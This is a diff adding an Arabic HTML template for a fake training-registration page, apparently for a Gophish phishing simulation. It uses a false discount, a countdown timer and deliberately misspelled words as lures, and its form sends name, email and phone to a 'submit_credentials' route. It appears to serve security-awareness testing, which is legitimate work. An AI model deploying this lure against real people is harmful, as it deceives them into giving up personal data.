@@ -1,0 +1,105 @@
+<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
+ <title>تأكيد التسجبل – خصم 70%</title>
+ <!-- خطأ إملائي مقصود -->
+ <style type="text/css">body{
+      margin:0; padding:0; background:#f7fafc;
+      font-family:Tahoma,Arial,sans-serif; color:#1f2937;
+      direction:rtl; text-align:right;
+    }
+    .wrap{
+      max-width:720px; margin:32px auto; background:#fff;
+      border:3px solid #2563eb; /* حدود زرقاء واضحة */
+      border-radius:14px; overflow:hidden;
+      box-shadow:0 4px 12px rgba(0,0,0,0.08);
+    }
+    .head{
+      padding:20px 24px; background:#f0f6ff; /* هيدر فاتح يبرز الشعار */
+      text-align:center;
+    }
+    .head img{ max-height:60px; margin-bottom:8px; }
+    .head h2{ margin:0; font-size:20px; color:#0f2d5c; }
+    .body{ padding:24px; line-height:1.9; }
+    .badge{
+      display:inline-block; padding:6px 12px; border-radius:999px;
+      background:#e6f2ff; color:#0f6ed8; font-size:13px; margin-bottom:12px;
+    }
+    .alert{
+      background:#fff7ed; border:1px solid #fed7aa; color:#7c2d12;
+      padding:10px 12px; border-radius:10px; font-size:13px; margin:12px 0;
+    }
+    .count{
+      display:inline-block; background:#111827; color:#fff;
+      border-radius:8px; padding:4px 8px; margin-inline:6px;
+    }
+    .grid{ display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-top:12px; }
+    .grid label{ font-size:13px; color:#374151; }
+    input, select{
+      width:100%; padding:10px; border:1px solid #d1d5db; border-radius:10px;
+      background:#fff;
+    }
+    .cta{
+      
+      margin-top:16px; padding:12px 24px; border:0; border-radius:10px;
+      background:#2563eb; /* أزرق */
+      color:#fff; font-weight:bold; cursor:pointer;
+      transition:background .2s ease;
+    }
+    .cta:hover{ background:#1e40af; } /* أزرق أغمق عند hover */
+    .note{ margin-top:10px; color:#6b7280; font-size:12px; }
+    .footer{
+      padding:16px 24px; background:#f9fafb; border-top:1px solid #e5e7eb;
+      text-align:center; color:#6b7280; font-size:12px;
+    }
+    .footer a{ color:#6b7280; text-decoration:none; }
+ </style>
+</head>
+<body dir="rtl">
+<div class="wrap">
+<div class="head"><img alt="شعار آفاق" src="{{ ngrok_url }}/static/images/Colored-2.png" />
+<h2>تأكيد التسجبل – خصم 70% لمعسكر المتدربين</h2>
+<!-- خطأ إملائي مقصود --></div>
+
+<div class="body"><span class="badge">عرض خاص للمتدربين</span>
+
+<div class="alert">العرض ينتهي خلال: <span class="count" id="h">02</span>: <span class="count" id="m">00</span>: <span class="count" id="s">00</span></div>
+<!-- اتركي الفورم بلا action ليعيد Gophish كتابته ويجمع البيانات -->
+
+<form method="post" action="{{ url_for('main.submit_credentials') }}">
+<div class="grid">
+<div><label>الاسم الكامل</label> <input name="username" required=""/></div>
+
+<div><label>البريد الإكتروني</label> <!-- خطأ إملائي مقصود --> <input name="email" required="" type="email"/></div>
+
+<div><label>رقم الجوال</label> <input name="phone" placeholder="05xxxxxxxx" required="" type="tel"/></div>
+
+<div><label>الدفعة</label> <select name="cohort" required=""><option value="">اختر الدفعة</option><option>دفعة أغسطس 2025</option><option>دفعة سبتمبر 2025</option><option>دفعة أكتوبر 2025</option><option>دفعة أخرى</option> </select></div>
+</div>
+
+<button class="cta" type="submit">تأكيد التسجيل بالخصم</button>
+
+<p class="note">سيتم حفظ مقعدك مؤقتًا بعد إرسال النموذج.</p>
+</form>
+</div>
+
+<div class="footer">© 2052 Afaq Training — <a href="#">Privacy</a> • <a href="#">Terms</a> • <a href="#">Contact</a></div>
+</div>
+<script>
+    (function(){
+      var end = Date.now() + 2*60*60*1000;
+      function pad(n){return (n<10?'0':'')+n}
+      function tick(){
+        var diff = end - Date.now();
+        if(diff < 0) diff = 0;
+        var h = Math.floor(diff/3600000);
+        var m = Math.floor((diff%3600000)/60000);
+      var s = Math.floor((diff%60000)/1000);
+        document.getElementById('h').textContent = pad(h);
+        document.getElementById('m').textContent = pad(m);
+        document.getElementById('s').textContent = pad(s);
+        if(diff>0) requestAnimationFrame(tick);
+      }
+      tick();
+    })();
+  </script>
+
+</body></html>  
